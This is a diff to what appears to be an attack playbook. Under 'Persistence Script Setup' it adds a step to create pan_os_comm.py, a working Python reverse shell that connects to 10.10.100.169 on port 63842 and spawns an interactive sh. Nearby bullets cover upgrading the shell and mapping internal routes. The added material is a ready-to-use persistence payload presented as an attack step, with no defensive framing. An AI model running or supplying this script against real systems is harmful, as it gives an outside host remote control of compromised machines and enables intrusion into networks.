@@ -15,6 +15,33 @@ Exploit Setup:
 
 Persistence Script Setup:
 
+1. Perform the following command: nano pan_os_comm.py
+2. In nano, copy and paste the below script:
+
+'''
+#!/usr/bin/env python3
+
+import socket
+import subprocess
+import os
+import pty
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("10.10.100.169", 63842))
+
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+pty.spawn("sh")
+
+'''
+
+
+
 Post-Exploitation:
 ● Upgrade shell if necessary.
 ● Identify internal routes/interfaces.
